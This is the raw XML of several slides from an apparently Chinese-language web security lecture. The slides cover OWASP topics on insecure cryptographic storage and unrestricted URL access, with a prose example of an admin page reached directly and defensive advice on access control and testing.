                <a:moveTo>
                  <a:pt x="957" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="932" y="77"/>
                  <a:pt x="965" y="374"/>
                  <a:pt x="805" y="463"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="645" y="552"/>
                  <a:pt x="168" y="517"/>
                  <a:pt x="0" y="531"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="448540" name="Freeform 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="5400000">
            <a:off x="1878807" y="4698206"/>
            <a:ext cx="609600" cy="2033587"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="957" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="805" y="463"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="0" y="531"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="965" h="552">
                <a:moveTo>
                  <a:pt x="957" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="932" y="77"/>
                  <a:pt x="965" y="374"/>
                  <a:pt x="805" y="463"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="645" y="552"/>
                  <a:pt x="168" y="517"/>
                  <a:pt x="0" y="531"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effec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8534"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(left)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="44853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par>
                          <p:cTn id="15" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="0"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="16" presetID="12" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="448536"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromTop)">
                                      <p:cBhvr>
                                        <p:cTn id="18" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="448536"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="19" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="20" presetID="12" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="448535"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromTop)">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4485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448539"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(right)">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="448539"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="28" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="29" presetID="1"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448540"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(right)">
                                      <p:cBhvr>
                                        <p:cTn id="35" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="448540"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="36" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="37" presetID="1"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34" grpId="0" animBg="1"/>
      <p:bldP spid="448535" grpId="0" animBg="1"/>
      <p:bldP spid="448536" grpId="0" animBg="1"/>
      <p:bldP spid="448539" grpId="0" animBg="1"/>
      <p:bldP spid="448540"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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、防御不安全的加密存储</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="478211" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>如非必要，不要保存敏感信息；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>确保所有的敏感信息都被加密，检查敏感信息的归档过程和政策；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>只使用经过证明的标准加密算法；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>小心存储口令、证书等信息。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="15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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4782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82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78211">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4782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82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78211">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4782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82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78211">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4782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82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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>访问缺少限制</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="424964" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1916113"/>
            <a:ext cx="8435975" cy="4249737"/>
          </a:xfrm>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Frequently, an application </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>only protects sensitive functionality by preventing the display of links or URLs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> to unauthorized users. Attackers can use this weakness to access and perform unauthorized operations by accessing those URLs directly.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="424965" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="911225" y="1219200"/>
            <a:ext cx="3763962" cy="579438"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="46800" rIns="90000" bIns="46800">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buFont typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>OWASP Definition</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"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4964">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4249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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>访问缺少限制</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="481283" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="476251" y="1373188"/>
            <a:ext cx="8296274" cy="4818062"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>当</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>应用缺少对某些</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>的访问限制，攻击者可以直接在浏览器中输入</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>来访问。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>比如：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Add_account_form.php  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>在显示这个表单页时要先对用户的管理员角色进行验证；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>表单填好后发送给</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>add_acct.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>执行添加帐号的功能；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>如果不限制</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>add_acct.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的直接访问，攻击者直接在浏览器中访问该页面，就绕过了权限检查。</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81283">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="481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81283">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="481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283">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="481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81283">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4812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81283">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4812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812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p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>防御缺少限制的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>访问</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="482307" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="468313" y="1628775"/>
            <a:ext cx="8229600" cy="2016125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400"/>
              <a:t>从需求阶段就要制定详细的安全策略；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400"/>
              <a:t>从页面到每一个功能，都只由相应的经过认证的角色来访问；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400"/>
              <a:t>访问控制策略越简单越好。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="482308" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2579688" y="1214438"/>
            <a:ext cx="2324100" cy="519112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="46800" rIns="90000" bIns="46800">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>从早期做起！</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="482309" name="Text Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2684463" y="3702050"/>
            <a:ext cx="2324100" cy="519113"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="46800" rIns="90000" bIns="46800">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>彻底地测试！</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="482310" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="4365625"/>
            <a:ext cx="8229600" cy="2016125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>进行详尽地测试保证访问控制没有被旁路；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
